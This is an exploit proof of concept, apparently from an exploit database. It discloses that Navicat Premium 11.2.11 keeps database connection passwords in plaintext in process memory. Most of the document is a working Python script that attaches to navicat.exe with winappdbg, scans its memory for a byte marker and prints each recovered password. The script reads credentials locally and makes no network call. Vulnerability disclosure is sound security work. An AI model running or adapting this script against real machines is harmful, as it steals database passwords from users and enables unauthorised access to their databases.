#####
# Navicat Premium 11.2.11 (64bit) Local Password Disclosure
# Tested on Windows Windows Server 2012 R2 64bit, English
# Vendor Homepage @ https://www.navicat.com/
# Date 05/09/2016
# Bug Discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
#
# http://www.black-rose.ml
#
# Special Thanks & Greetings to friend of mine Viktor Minin (https://www.exploit-db.com/author/?a=8052) | (https://1-33-7.com/)
#####
# Navicat Premium client v11.2.11 is vulnerable to local password disclosure, the supplied password is stored in a plaintext format in memory process.
# A potential attacker could reveal the supplied password in order to gain access to the database.
# Proof-Of-Concept Code:
#####

import time
from winappdbg import Debug, Process

count 		= 0
found		= 0
filename 	= "navicat.exe"
process_pid = 0
memory_dump	= []

def b2h(str):
    return ''.join(["%02X " % ord(x) for x in str]).strip()

def h2b(str):
	bytes = []
	str = ''.join(str.split(" "))
	for i in range(0, len(str), 2):
		bytes.append(chr(int(str[i:i+2], 16)))
	return ''.join(bytes)

debug = Debug()
try:
	print "[~] Searching for pid by process name '%s'.." % (filename)
	time.sleep(1)
	debug.system.scan_processes()
	for (process, process_name) in debug.system.find_processes_by_filename(filename):
		process_pid = process.get_pid()
	if process_pid is not 0:
		print "[+] Found process with pid #%d" % (process_pid)
		time.sleep(1)
		print "[~] Trying to read memory for pid #%d" % (process_pid)
		
		process = Process(process_pid)
		for address in process.search_bytes('\x00\x90\x18\x00\x00\x00\x00\x00\x00\x00'):
			memory_dump.append(process.read(address,30))
		memory_dump.pop(0)
		for i in range(len(memory_dump)):
			str = b2h(memory_dump[i])
			first = str.split("00 90 18 00 00 00 00 00 00 00 ")[1]
			last = first.split("00 ")
			if last[0]:
				count = count+1
				found = 1
				print "[+] Password for connection #%d found as %s" % (count, h2b(last[0]))
		if found == 0:
			print "[-] Password not found! Make sure the client is connected at least to one database."
	else:
		print "[-] No process found with name '%s'." % (filename)
	
	debug.loop()
finally:
    debug.stop()